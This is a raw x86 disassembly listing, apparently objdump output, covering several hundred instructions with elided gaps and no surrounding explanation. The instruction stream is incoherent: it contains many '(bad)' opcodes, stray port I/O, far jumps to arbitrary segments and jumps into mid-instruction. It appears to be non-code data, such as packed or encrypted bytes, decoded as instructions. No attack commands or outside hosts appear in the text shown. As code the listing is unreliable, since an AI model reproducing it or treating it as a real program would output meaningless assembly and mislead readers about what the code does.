  41f1a7:	hlt    
  41f1a8:	pusha  
  41f1a9:	sub    al,BYTE PTR [edi+esi*1]
  41f1ac:	sub    eax,0x3a4dcd75
  41f1b1:	pop    ebx
  41f1b2:	adc    al,0xaf
  41f1b4:	cmp    dl,BYTE PTR [ebx+esi*4]
  41f1b7:	repnz cmp eax,0x20913f51
  41f1bd:	mov    ah,0xe4
  41f1bf:	enter  0x3f58,0x90
  41f1c3:	aam    0x22
  41f1c5:	addr16 in al,dx
  41f1c7:	xor    ebx,DWORD PTR ds:0xba164629
  41f1cd:	push   ss
  41f1ce:	outs   dx,DWORD PTR ds:[esi]
  41f1cf:	push   edi
  41f1d0:	inc    ecx
  41f1d1:	repnz or edi,eax
  41f1d4:	pop    es
  41f1d5:	xchg   cl,bh
  41f1d7:	sahf   
  41f1d8:	cmc    
  41f1d9:	dec    edi
  41f1da:	xlat   BYTE PTR ds:[ebx]
  41f1db:	dec    edx
  41f1dc:	and    al,0x83
  41f1de:	sub    al,BYTE PTR [ebp+0x4e]
  41f1e1:	outs   dx,BYTE PTR ds:[esi]
  41f1e2:	add    ecx,esi
  41f1e4:	les    eax,FWORD PTR [esi+ebx*8+0x3911a0f8]
  41f1eb:	fs push 0xffffffee
  41f1ee:	pop    edi
  41f1ef:	jo     0x41f186
  41f1f1:	or     BYTE PTR [eax-0x59a19656],dh
  41f1f7:	int3   
  41f1f8:	mov    ds:0x87fc47c5,al
  41f1fd:	mov    ecx,0x2457fc7d
  41f202:	or     bl,bh
  41f204:	enter  0x19d5,0xd2
  41f208:	jnp    0x41f1ac
  41f20a:	iret   
  41f20b:	in     al,dx
  41f20c:	jb     0x41f1b3
  41f20e:	xchg   esi,eax
  41f20f:	dec    eax
  41f210:	dec    ebx
  41f211:	sub    dh,bh
  41f213:	push   bx
  41f215:	sub    al,0x9e
  41f217:	cvtpi2ps xmm3,mm0
  41f21a:	push   eax
  41f21b:	pop    edi
  41f21c:	sub    ch,BYTE PTR [edx+0x4e53902c]
  41f222:	dec    esp
  41f223:	std    
  41f224:	push   ds
  41f225:	dec    ebp
  41f226:	pop    eax
  41f227:	sbb    al,0xf4
  41f229:	mov    dl,0x4f
  41f22b:	add    ah,bh
  41f22d:	bound  ebp,QWORD PTR [edx+ebp*8]
  41f230:	js     0x41f24b
  41f232:	push   ebx
  41f233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f234:	out    0x44,eax
  41f236:	pop    ds
  41f237:	jo     0x41f2b2
  41f239:	sub    DWORD PTR [esi+esi*4+0x3bc35d35],esp
  41f240:	fnstsw WORD PTR [ebx-0x193946dc]
  41f246:	xchg   esi,eax
  41f247:	xchg   edi,eax
  41f248:	daa    
  41f249:	jb     0x41f271
  41f24b:	jae    0x41f23e
  41f24d:	nop
  41f24e:	into   
  41f24f:	pop    ds
  41f250:	adc    al,0x6f
  41f252:	xchg   esi,eax
  41f253:	mov    ds,esi
  41f255:	les    esi,FWORD PTR [esi-0x2d]
  41f258:	mov    bl,0x44
  41f25a:	and    BYTE PTR [ebp+0xc2075fc],0x9e
  41f261:	ret    
  41f262:	cdq    
  41f263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f264:	mov    al,ds:0xcf7b60ac
  41f269:	ins    DWORD PTR es:[edi],dx
  41f26a:	loop   0x41f24b
  41f26c:	sahf   
  41f26d:	push   es
  41f26e:	xlat   BYTE PTR ds:[ebx]
  41f26f:	fsub   QWORD PTR [edi+0x4a2efcae]
  41f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f276:	mov    dl,0x53
  41f278:	lods   al,BYTE PTR ds:[esi]
  41f279:	and    al,0x54
  41f27b:	(bad)  
  41f27c:	jle    0x41f253
  41f27e:	ss inc esp
  41f280:	in     eax,dx
  41f281:	in     al,0x38
  41f283:	rcl    DWORD PTR [edi-0x4d],0x76
  41f287:	or     eax,eax
  41f289:	scas   eax,DWORD PTR es:[edi]
  41f28a:	adc    ah,BYTE PTR [ebp+0x63]
  41f28d:	cld    
  41f28e:	add    bl,ah
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f29b
  41f301:	call   0x1:0x4bbc6b0f
  41f308:	add    al,0x1
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	xchg   edi,eax
  41f30d:	into   
  41f30e:	ins    DWORD PTR es:[edi],dx
  41f30f:	ins    BYTE PTR es:[edi],dx
  41f310:	fdiv   DWORD PTR [eax+0x784ce1aa]
  41f316:	mov    bh,0x8e
  41f318:	ins    DWORD PTR es:[edi],dx
  41f319:	sub    al,0xe3
  41f31b:	or     al,0xc2
  41f31d:	rcr    BYTE PTR [ebp+ecx*2+0x3a6bce65],0xa6
  41f325:	fisttp QWORD PTR [ecx+ecx*1-0x46d80b52]
  41f32c:	ret    
  41f32d:	sub    BYTE PTR [edx+0x32],0xc4
  41f331:	inc    ecx
  41f332:	xchg   ebx,eax
  41f333:	stc    
  41f334:	int3   
  41f335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f336:	add    eax,0x1768c22c
  41f33b:	jmp    0x1af2:0x5377388
  41f342:	fdiv   st(3),st
  41f344:	mov    cl,0xf4
  41f346:	retf   0x8340
  41f349:	fild   WORD PTR [ebx+0xd]
  41f34c:	imul   edi,DWORD PTR ds:0xb27576f6,0xffffffd2
  41f353:	ins    DWORD PTR es:[edi],dx
  41f354:	mov    bh,0x58
  41f356:	mov    eax,0x6b51a6ca
  41f35b:	cwde   
  41f35c:	dec    ebx
  41f35d:	mov    ebp,0x721540d
  41f362:	and    ah,BYTE PTR [esi+0x6fe46cb4]
  41f368:	in     al,dx
  41f369:	je     0x41f396
  41f36b:	pop    ecx
  41f36c:	jg     0x41f342
  41f36e:	outs   dx,BYTE PTR ds:[esi]
  41f36f:	(bad)
  41f373:	lods   eax,DWORD PTR ds:[esi]
  41f374:	pop    ebp
  41f375:	cmp    eax,0xec8befa7
  41f37a:	cwde   
  41f37b:	in     eax,dx
  41f37c:	addr16 pop esp
  41f37e:	mov    cl,0x72
  41f380:	pop    edi
  41f381:	mov    WORD PTR [ebx],cs
  41f383:	push   eax
  41f384:	into   
  41f385:	sbb    DWORD PTR [edx-0x50],esp
  41f388:	dec    ecx
  41f389:	and    al,0xf
  41f38b:	bound  ebx,QWORD PTR [eax-0x65]
  41f38e:	fisubr DWORD PTR [ecx]
  41f390:	push   edx
  41f391:	sbb    bh,BYTE PTR [edx+0x250afb6b]
  41f397:	mov    bl,0xfd
  41f399:	ins    DWORD PTR es:[edi],dx
  41f39a:	mov    edx,0x98b1b42b
  41f39f:	mov    edi,0x2cb4ddb5
  41f3a4:	out    dx,eax
  41f3a5:	xor    BYTE PTR [edx-0x2],0x4a
  41f3a9:	dec    ecx
  41f3aa:	jne    0x41f40a
  41f3ac:	dec    edi
  41f3ad:	sbb    eax,esi
  41f3af:	sbb    al,0x33
  41f3b1:	push   edi
  41f3b2:	pop    ebx
  41f3b3:	xlat   BYTE PTR ds:[ebx]
  41f3b4:	pop    eax
  41f3b5:	std    
  41f3b6:	push   cs
  41f3b7:	add    eax,0xf9bb5e5e
  41f3bc:	jp     0x41f35d
  41f3be:	test   DWORD PTR [esi-0x36],ebp
  41f3c1:	jbe    0x41f404
  41f3c3:	fwait
  41f3c4:	cwde   
  41f3c5:	pop    edi
  41f3c6:	cdq    
  41f3c7:	fiadd  WORD PTR [edi]
  41f3c9:	and    BYTE PTR [ebx-0x20f140a2],bh
  41f3cf:	mov    ebp,0x47559bd6
  41f3d4:	mov    eax,0x40c92a2d
  41f3d9:	pop    ebp
  41f3da:	add    eax,DWORD PTR [ecx-0xf]
  41f3dd:	cmp    ecx,DWORD PTR [eax-0x79]
  41f3e0:	pop    eax
  41f3e1:	in     eax,0x7e
  41f3e3:	lods   al,BYTE PTR ds:[esi]
  41f3e4:	jnp    0x41f3a8
  41f3e6:	jns    0x41f457
  41f3e8:	pop    ebp
  41f3e9:	frstor [eax+0x7d]
  41f3ec:	mov    ebp,0x300f2ff0
  41f3f1:	(bad)  
  41f3f3:	test   DWORD PTR [edi],0x1fed1cd5
  41f3f9:	fs push ss
  41f3fb:	frstor [edi]
  41f3fd:	dec    ebp
  41f3fe:	fwait
  41f3ff:	lahf   
  41f400:	mov    ecx,0x6d02693e
  41f405:	cmp    bh,BYTE PTR [eax+0x7a14c94c]
  41f40b:	fnsave [ebp+0x5d]
  41f40e:	fiadd  DWORD PTR fs:[eax]
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x49
  41f481:	ror    DWORD PTR [esi-0x71],cl
  41f484:	ror    BYTE PTR [ecx+eax*1+0x0],0x4
  41f489:	add    DWORD PTR [eax],eax
  41f48b:	add    BYTE PTR [edi+ebp*2],al
  41f48e:	mov    WORD PTR [edi+0x690e171a],gs
  41f494:	dec    ecx
  41f495:	xchg   ebp,eax
  41f496:	mov    ch,0xb9
  41f498:	dec    ecx
  41f499:	mov    al,0x26
  41f49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f49c:	loope  0x41f4af
  41f49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49f:	shl    BYTE PTR [eax],0x9f
  41f4a2:	ror    DWORD PTR [edx+0x4a],0xa6
  41f4a6:	ins    DWORD PTR es:[edi],dx
  41f4a7:	repz dec ebp
  41f4a9:	jg     0x41f526
  41f4ab:	scas   al,BYTE PTR es:[edi]
  41f4ac:	sbb    eax,0x733c4355
  41f4b1:	test   DWORD PTR [ebp-0x6bfa905a],0x32e21f88
  41f4bb:	mov    dh,0xef
  41f4bd:	or     DWORD PTR [ecx-0x2a2e2592],ebp
  41f4c3:	into   
  41f4c4:	sahf   
  41f4c5:	and    eax,DWORD PTR ds:0x32033a29
  41f4cb:	jecxz  0x41f4ef
  41f4cd:	and    BYTE PTR ds:0x16678134,bh
  41f4d3:	xchg   edi,eax
  41f4d4:	ins    BYTE PTR es:[edi],dx
  41f4d5:	xor    bh,BYTE PTR ds:0xed4499c9
  41f4db:	cmp    ecx,ecx
  41f4dd:	jmp    0x3aea:0x2dfd258b
  41f4e4:	inc    ebp
  41f4e5:	loopne 0x41f515
  41f4e7:	fmul   QWORD PTR [ebp-0x66]
  41f4ea:	jne    0x41f513
  41f4ec:	lahf   
  41f4ed:	jmp    0x41f47e
  41f4ef:	out    dx,eax
  41f4f0:	sahf   
  41f4f1:	push   ecx
  41f4f2:	cmp    al,0x0
  41f4f4:	rcr    DWORD PTR [eax+0x4e],1
  41f4f7:	or     al,0xc6
  41f4f9:	mov    edi,0x760021fa
  41f4fe:	xchg   ecx,eax
  41f4ff:	dec    ebx
  41f500:	das    
  41f501:	int    0x39
  41f503:	dec    esi
  41f504:	cwde   
  41f505:	sti    
  41f506:	or     BYTE PTR [edi-0x568e2e85],cl
  41f50c:	jle    0x41f4a2
  41f50e:	fist   DWORD PTR ds:0x37c4d22b
  41f514:	jge    0x41f50b
  41f516:	in     al,0x53
  41f518:	mulps  xmm4,xmm6
  41f51b:	jl     0x41f4ac
  41f51d:	rsm    
  41f51f:	jmp    0x5a79:0x105ab96b
  41f526:	push   0xffffff94
  41f528:	mov    ?,WORD PTR [ebx-0x7bf7cc77]
  41f52e:	dec    esp
  41f52f:	fsub   DWORD PTR [esi-0x6d]
  41f532:	nop    DWORD PTR ds:0x63f561af
  41f539:	pop    ds
  41f53a:	cli    
  41f53b:	int3   
  41f53c:	loope  0x41f5a7
  41f53e:	fmul   DWORD PTR [ebp+0x42b3dfb0]
  41f544:	mov    ebp,0x4a5d06d7
  41f549:	mov    edi,0x12f0ccba
  41f54e:	(bad)  
  41f54f:	mov    BYTE PTR [esi],bh
  41f551:	out    0xd5,eax
  41f553:	jo     0x41f52e
  41f555:	pop    esp
  41f556:	or     ch,ch
  41f558:	mov    al,ds:0xbcafbcd6
  41f55d:	xor    al,dh
  41f55f:	inc    edi
  41f560:	mov    eax,0x4c2a1a95
  41f565:	mov    ah,0x26
  41f567:	ss mov edx,0x3a68b9e5
  41f56d:	push   es
  41f56e:	mov    ebp,0xa8988a0b
  41f573:	push   ss
  41f574:	loope  0x41f558
  41f576:	rcr    BYTE PTR [edx],0xed
  41f579:	pop    edx
  41f57a:	stos   BYTE PTR es:[edi],al
  41f57b:	sahf   
  41f57c:	shl    al,0xe7
  41f57f:	mov    esi,DWORD PTR [edx+eax*2+0x3f]
  41f583:	retf   
  41f584:	div    DWORD PTR [eax+0x14fa36f6]
  41f58a:	loopne 0x41f5a1
  41f58c:	mov    ebx,0x23fefa
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x1546:0xbb82d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	lea    ebp,[ecx-0x4c]
  41f60f:	adc    ebx,edx
  41f611:	test   al,0xff
  41f613:	add    eax,0x11aaef44
  41f618:	ja     0x41f60e
  41f61a:	mov    ch,0x5d
  41f61c:	mov    esp,0x67f3d49
  41f621:	adc    eax,0x11e4b154
  41f626:	sahf   
  41f627:	pop    ss
  41f628:	mov    bl,0x52
  41f62a:	enter  0xe380,0x2d
  41f62e:	xor    al,0x21
  41f630:	mov    dl,0x7a
  41f632:	fdivr  st,st(0)
  41f634:	out    0x2b,al
  41f636:	aad    0x4c
  41f638:	out    0x32,al
  41f63a:	cmc    
  41f63b:	mov    bl,0x40
  41f63d:	ins    DWORD PTR es:[edi],dx
  41f63e:	adc    eax,0xb3ed2fcc
  41f643:	jns    0x41f6c1
  41f645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f646:	arpl   WORD PTR [ecx+0x29e249ec],bp
  41f64c:	mov    dh,0x21
  41f64e:	jmp    0xb72f:0xe469ec13
  41f655:	mov    edx,0x1164ab4e
  41f65a:	mov    ebp,0x7bb4eb6d
  41f65f:	stos   BYTE PTR es:[edi],al
  41f660:	enter  0x593a,0xd3
  41f664:	imul   esp,DWORD PTR [eax-0x2d],0xffffffc1
  41f668:	mov    edx,0x9497afc8
  41f66d:	fidiv  DWORD PTR [ebx+ecx*2-0x39]
  41f671:	je     0x41f610
  41f673:	loopne 0x41f610
  41f675:	dec    ebx
  41f676:	lahf   
  41f677:	add    cl,BYTE PTR [edi+0x50]
  41f67a:	dec    esp
  41f67b:	inc    eax
  41f67c:	ror    BYTE PTR [ebx],1
  41f67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f67f:	mov    ds:0x11968f41,eax
  41f684:	add    dh,BYTE PTR [eax+ebp*1+0x63633ca8]
  41f68b:	lock sahf 
  41f68d:	pop    eax
  41f68e:	and    ecx,eax
  41f690:	pop    ebp
  41f691:	fs das 
  41f693:	enter  0xaafd,0x32
  41f697:	pop    edx
  41f698:	out    0x72,eax
  41f69a:	dec    ebx
  41f69b:	fwait
  41f69c:	in     al,dx
  41f69d:	ficomp WORD PTR [edi+edx*1+0x2d]
  41f6a1:	shr    DWORD PTR [ebx-0x4d9f151a],0xbb
  41f6a8:	imul   esp,DWORD PTR [ebx],0x39cfe06b
  41f6ae:	push   edx
  41f6af:	sbb    eax,0xd4d574b0
  41f6b4:	dec    esp
  41f6b5:	hlt    
  41f6b6:	dec    ebx
  41f6b7:	xchg   bh,cl
  41f6b9:	sub    BYTE PTR [edi-0x39],dl
  41f6bc:	add    eax,0xfd8cdcae
  41f6c1:	or     DWORD PTR [eax+0x51],ecx
  41f6c4:	fwait
  41f6c5:	(bad)  
  41f6c6:	lock cmc 
  41f6c8:	test   BYTE PTR [ecx],dl
  41f6ca:	fwait
  41f6cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6cc:	dec    esi
  41f6cd:	repnz mov es,ebx
  41f6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d1:	mov    bh,0xda
  41f6d3:	or     BYTE PTR [ecx-0x30],al
  41f6d6:	ret    0x1e4
  41f6d9:	push   es
  41f6da:	aas    
  41f6db:	jmp    FWORD PTR [edi]
  41f6dd:	mov    ds:0x98496924,al
  41f6e2:	scas   eax,DWORD PTR es:[edi]
  41f6e3:	(bad)  
  41f6e5:	ret    
  41f6e6:	pop    ss
  41f6e7:	call   0x5ec3:0xab7d7a56
  41f6ee:	add    al,0x3d
  41f6f0:	pop    es
  41f6f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f2:	add    al,BYTE PTR [eax]
  41f6f4:	add    edx,DWORD PTR [edi-0x798c1cbf]
  41f6fa:	add    DWORD PTR [ebp+0x4d],ecx
  41f6fd:	sbb    ah,dl
  41f6ff:	mov    ebp,0x967cb816
  41f704:	outs   dx,DWORD PTR ds:[esi]
  41f705:	sub    BYTE PTR [eax-0x3a],0x3b
  41f709:	(bad)  [esi+ecx*1]
  41f70c:	(bad)  
  41f70d:	xchg   ecx,eax
  41f70e:	test   DWORD PTR [edi],ebx
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xee5f:0x406c62d2
  41f783:	push   eax
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	ins    DWORD PTR es:[edi],dx
  41f78d:	les    edx,FWORD PTR [ebx-0x2f006d3a]
  41f793:	adc    ebx,edx
  41f795:	mov    ebx,0xb62852a5
  41f79a:	or     al,0x61
  41f79c:	mov    ch,ah
  41f79e:	imul   esp,eax,0xffffffd7
  41f7a1:	fst    st(6)
  41f7a3:	mov    edx,0xaa1a73f3
  41f7a8:	clc    
  41f7a9:	and    BYTE PTR [esi-0xce34682],dl
  41f7af:	mov    edi,0x6f652118
  41f7b4:	hlt    
  41f7b5:	inc    ebx
  41f7b6:	cmp    esi,edx
  41f7b8:	cld    
  41f7b9:	test   DWORD PTR [edi-0x1d],eax
  41f7bc:	jg     0x41f7df
  41f7be:	inc    esi
  41f7bf:	ss mov al,0xbf
  41f7c2:	fsub   DWORD PTR [edi+0x38f54a61]
  41f7c8:	push   esp
  41f7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ca:	cmp    eax,0x1b4aadde
  41f7cf:	add    esp,esi
  41f7d1:	sbb    al,BYTE PTR [ebx]
  41f7d3:	in     al,0xbb
  41f7d5:	retf   0x7638
  41f7d8:	scas   eax,DWORD PTR es:[edi]
  41f7d9:	gs mov eax,0x90dc60d4
  41f7df:	std    
  41f7e0:	and    DWORD PTR [edi],ecx
  41f7e2:	mov    DWORD PTR [eax-0x5e],ecx
  41f7e5:	loopne 0x41f768
  41f7e7:	mov    al,ds:0xa032bbb9
  41f7ec:	and    esp,edi
  41f7ee:	test   DWORD PTR [edi+esi*2],ebx
  41f7f1:	inc    esi
  41f7f2:	cmp    DWORD PTR [ebp-0x67],edi
  41f7f5:	(bad)  
  41f7f6:	in     al,0xc5
  41f7f8:	cwde   
  41f7f9:	imul   edx,DWORD PTR ds:0xd0568ffb,0x46
  41f800:	or     eax,0xff1df807
  41f805:	adc    esi,esi
  41f807:	jae    0x41f821
  41f809:	sbb    ah,0xb
  41f80c:	dec    eax
  41f80d:	in     al,0xfb
  41f80f:	mov    bh,0x9a
  41f811:	icebp  
  41f812:	cmp    al,0x80
  41f814:	fcmovnbe st,st(2)
  41f816:	(bad)  
  41f817:	xor    al,0x90
  41f819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f81a:	mov    dl,0xb5
  41f81c:	je     0x41f7c6
  41f81e:	fucomi st,st(1)
  41f820:	stc    
  41f821:	or     al,0x86
  41f823:	jge    0x41f847
  41f825:	inc    esi
  41f826:	cmp    ecx,ebx
  41f828:	stos   DWORD PTR es:[edi],eax
  41f829:	pop    esi
  41f82a:	dec    ebx
  41f82b:	lods   eax,DWORD PTR ds:[esi]
  41f82c:	sbb    esi,edx
  41f82e:	xchg   BYTE PTR [esi+0x65c6da28],al
  41f834:	push   ebx
  41f835:	pop    esp
  41f836:	mov    ah,0xb8
  41f838:	test   eax,0xc95e6316
  41f83d:	call   0x9675:0x187af2d1
  41f844:	push   0x38
  41f846:	adc    al,0xa1
  41f848:	std    
  41f849:	sahf   
  41f84a:	mov    eax,0x47b8b6bc
  41f84f:	loopne 0x41f846
  41f851:	mov    eax,ds:0x39f8b306
  41f856:	cmp    DWORD PTR ds:[edx],ebx
  41f859:	mov    ebp,ecx
  41f85b:	jmp    0x41f8d2
  41f85d:	sbb    DWORD PTR [edi-0x6a60a36f],0x6c
  41f864:	rcl    dh,0x65
  41f867:	gs xchg esi,eax
  41f869:	scas   al,BYTE PTR es:[edi]
  41f86a:	(bad)  
  41f86b:	push   esp
  41f86c:	mov    eax,ds:0x64420049
  41f871:	mov    ch,BYTE PTR [esi+0x22467402]
  41f877:	inc    edx
  41f878:	in     eax,0x40
  41f87a:	mov    ds:0x16270445,eax
  41f87f:	adc    bh,BYTE PTR [esi-0x46e6a3f]
  41f885:	xchg   ebp,eax
  41f886:	fwait
  41f887:	mov    ds:0xfcd74399,eax
  41f88c:	xchg   ebp,eax
  41f88d:	aaa    
  41f88e:	dec    esp
  41f88f:	sbb    eax,DWORD PTR [eax]
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	(bad)  
  41f901:	daa    
  41f902:	ja     0x41f8e8
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	push   ebp
  41f90d:	hlt    
  41f90e:	in     al,0xc2
  41f910:	movups xmm3,XMMWORD PTR [eax]
  41f913:	dec    ebp
  41f914:	dec    esp
  41f915:	nop    DWORD PTR [edi+ebp*8-0x52]
  41f91a:	aad    0xfe
  41f91c:	xor    eax,0xa2580cc8
  41f921:	mov    edi,0x8e18ea43
  41f926:	fldenv ss:[ecx+ebp*2-0x2aa8bbd]
  41f92e:	arpl   WORD PTR [ebx],sp
  41f930:	jo     0x41f8df
  41f932:	sbb    eax,0x6a94ba82
  41f937:	leave  
  41f938:	sub    ecx,DWORD PTR [ebp+0x47baffe2]
  41f93e:	mov    ecx,gs
  41f940:	dec    ebp
  41f941:	lods   eax,DWORD PTR ds:[esi]
  41f942:	scas   al,BYTE PTR es:[edi]
  41f943:	cmp    cl,cl
  41f945:	cmp    ebx,DWORD PTR [esi+0x3adc40d8]
  41f94b:	sub    ebx,edi
  41f94d:	stos   DWORD PTR es:[edi],eax
  41f94e:	dec    edx
  41f94f:	test   DWORD PTR [ebp+0x3dbb4f7a],ecx
  41f955:	adc    DWORD PTR [ebx+eiz*1],edi
  41f958:	xchg   DWORD PTR [edx],ecx
  41f95a:	cmp    eax,ebp
  41f95c:	mov    al,0xe4
  41f95e:	xchg   ch,ch
  41f960:	out    0x3,eax
  41f962:	jp     0x41f966
  41f964:	jae    0x41f9be
  41f966:	arpl   WORD PTR [edi+0x7933b13a],bx
  41f96c:	jle    0x41f992
  41f96e:	or     eax,0x9fc300db
  41f973:	call   0x11d4eb0d
  41f978:	lock arpl WORD PTR [esi-0x46e079d5],bp
  41f97f:	push   ds
  41f980:	sub    ecx,DWORD PTR [ecx-0x6e]
  41f983:	aam    0xfd
  41f985:	push   ss
  41f986:	jno    0x41f9d1
  41f988:	sbb    ebp,DWORD PTR [edx+0x77e3e08a]
  41f98e:	sub    BYTE PTR [ebx-0x20],dh
  41f991:	cs fwait
  41f993:	jg     0x41f94e
  41f995:	jmp    0x8ab3215d
  41f99a:	sub    eax,0x5750aee2
  41f99f:	int    0x41
  41f9a1:	(bad)  
  41f9a2:	retf   
  41f9a3:	fild   DWORD PTR [ebx+0x3c]
  41f9a6:	aaa    
  41f9a7:	inc    edx
  41f9a8:	shl    DWORD PTR [edi],1
  41f9aa:	mov    bh,0xee
  41f9ac:	jg     0x41f9eb
  41f9ae:	adc    dh,BYTE PTR [ebp-0x14d391d0]
  41f9b4:	push   sp
  41f9b6:	ret    0x940f
  41f9b9:	xchg   ebx,eax
  41f9ba:	mov    ecx,0xb5400e5f
  41f9bf:	xor    esi,DWORD PTR [eax]
  41f9c1:	idiv   BYTE PTR [ebx+0x7804d413]
  41f9c7:	out    0x8c,al
  41f9c9:	fcomp  DWORD PTR [edi]
  41f9cb:	push   ecx
  41f9cc:	and    al,0x84
  41f9ce:	jl     0x41f9e3
  41f9d0:	jae    0x41f96f
  41f9d2:	div    BYTE PTR [edx+edi*1]
  41f9d5:	mov    al,0xb5
  41f9d7:	sub    eax,0xf3528fcd
  41f9dc:	or     DWORD PTR [esi-0x66],edx
  41f9df:	int3   
  41f9e0:	xor    esp,DWORD PTR [ecx]
  41f9e2:	cmc    
  41f9e3:	sub    bl,bh
  41f9e5:	ficom  DWORD PTR [edx+0x69]
  41f9e8:	jg     0x41fa4c
  41f9ea:	inc    edi
  41f9eb:	addr16 inc esp
  41f9ed:	in     al,dx
  41f9ee:	sub    edi,DWORD PTR [esi+esi*8-0x6e669e65]
  41f9f5:	(bad)  
  41f9f6:	(bad)  
  41f9f7:	test   eax,0xcbceb9f4
  41f9fc:	jp     0x41f9fd
  41f9fe:	pop    esp
  41f9ff:	sbb    ecx,DWORD PTR [ecx]
  41fa01:	dec    ebp
  41fa02:	jns    0x41f9b5
  41fa04:	fild   WORD PTR [ecx+0x7]
  41fa07:	nop
  41fa08:	xor    al,ah
  41fa0a:	sub    edi,DWORD PTR [edx+ebx*1-0x55]
  41fa0e:	xchg   BYTE PTR [ebx+0x0],ch
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x49b8c13b
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	mov    ah,0x3a
  41fa8e:	shl    BYTE PTR [eax],0x36
  41fa91:	mov    WORD PTR [ecx],cs
  41fa93:	fimul  DWORD PTR [eax+0x70]
  41fa96:	(bad)  
  41fa98:	stos   DWORD PTR es:[edi],eax
  41fa99:	jno    0x41fac0
  41fa9b:	addr16 mov al,ds:0xb0e2
  41fa9f:	clc    
  41faa0:	retf   0x7ea3
  41faa3:	add    al,0x6
  41faa5:	jge    0x41fadd
  41faa7:	cdq    
  41faa8:	xchg   BYTE PTR [ecx-0x6],bl
  41faab:	push   eax
  41faac:	mov    bh,0x1a
  41faae:	lahf   
  41faaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab0:	gs adc al,0xad
  41fab3:	popa   
  41fab4:	and    bh,BYTE PTR [ebp-0x423ef595]
  41faba:	fist   DWORD PTR [ecx]
  41fabc:	mov    ebp,0xb59a7d8c
  41fac1:	add    eax,0xa520bc36
  41fac6:	inc    edx
  41fac7:	fnsave [ebp+eiz*1-0x5c]
  41facb:	lock pop edx
  41facd:	pop    ds
  41face:	sub    DWORD PTR [esi-0x78],0x30
  41fad2:	cdq    
  41fad3:	hlt    
  41fad4:	jmp    0x2da8e6fd
  41fad9:	sbb    BYTE PTR [edx-0x69935fd],cl
  41fadf:	stos   DWORD PTR es:[edi],eax
  41fae0:	cli    
  41fae1:	mov    DWORD PTR [ecx+0x3d109c37],edx
  41fae7:	into   
  41fae8:	mov    BYTE PTR [eax],0x1b
  41faeb:	in     eax,0xf7
  41faed:	pop    esi
  41faee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faef:	and    al,0x37
  41faf1:	jge    0x41fb12
  41faf3:	jno    0x41fa88
  41faf5:	inc    esi
  41faf6:	mov    al,ds:0x60dc54bb
  41fafb:	clc    
  41fafc:	jno    0x41fb02
  41fafe:	push   cs
  41faff:	call   0xc3b6cfb0
  41fb04:	push   cs
  41fb05:	inc    ebp
  41fb06:	arpl   WORD PTR [edi+esi*8],si
  41fb09:	adc    dh,BYTE PTR [eax+0x75c7cc19]
  41fb0f:	js     0x41fabb
  41fb11:	sub    BYTE PTR [esi+0x43],bl
  41fb14:	and    ch,0xad
  41fb17:	not    DWORD PTR [eax+edi*4-0x10879249]
  41fb1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb1f:	ins    DWORD PTR es:[edi],dx
  41fb20:	dec    ebp
  41fb21:	mov    edx,ecx
  41fb23:	dec    eax
  41fb24:	and    DWORD PTR [eax+0x49634ba4],0xa57b42bb
  41fb2e:	jnp    0x41fae8
  41fb30:	xchg   ebx,eax
  41fb31:	dec    ecx
  41fb32:	push   eax
  41fb33:	jns    0x41fb12
  41fb35:	mov    bh,0xa9
  41fb37:	call   0xb862:0x80c66749
  41fb3e:	int3   
  41fb3f:	sahf   
  41fb40:	rcr    DWORD PTR [esi+edi*2+0x1bdd95b8],0x26
  41fb48:	nop
  41fb49:	and    eax,0xcb6ff2b1
